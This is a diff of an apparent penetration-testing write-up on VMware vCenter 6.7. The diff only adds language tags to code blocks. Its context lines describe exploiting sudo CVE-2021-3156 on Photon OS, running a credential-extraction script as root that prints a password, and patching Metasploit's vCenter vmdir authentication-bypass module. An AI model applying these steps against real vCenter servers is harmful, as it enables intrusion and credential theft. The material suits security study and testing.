@@ -18,7 +18,7 @@ alhough be patient, it usually succeeds in about 70% of attemtps only. If you do
 
 Vcenter 6.7.0 vsphere appliance runs on Photon OS Linux 1.0 with a sudo 1.8.20p2 vulnerable to CVE-2021-3156
 
-```
+```bash
 # cat /etc/photon-release
 VMware Photon Linux 1.0
 PHOTON_BUILD_NUMBER=62c543d
@@ -68,7 +68,7 @@ if __name__ == "__main__":
 Note: it does not work if run by `vsphere-ui` user, it requires root priviledges.
 
 You obtain the user name and password:
-```
+```bash
 root@10.0.0.1 [ /tmp ]# ./get_creds.py
 ('10.0.0.1', 'Password123')
 ```
@@ -82,7 +82,7 @@ account with Metasploit's `auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass
 At the time of writing this article the Metasploit module needs to be adjusted with a pull request https://github.com/rapid7/metasploit-framework/pull/15656
 In the mean time you may adjust the below function in `vmware_vcenter_vmdir_auth_bypass` yourself:
 
-```
+```ruby
   def auth_bypass(ldap)
     unless datastore['BIND_DN']
       ldap.bind(
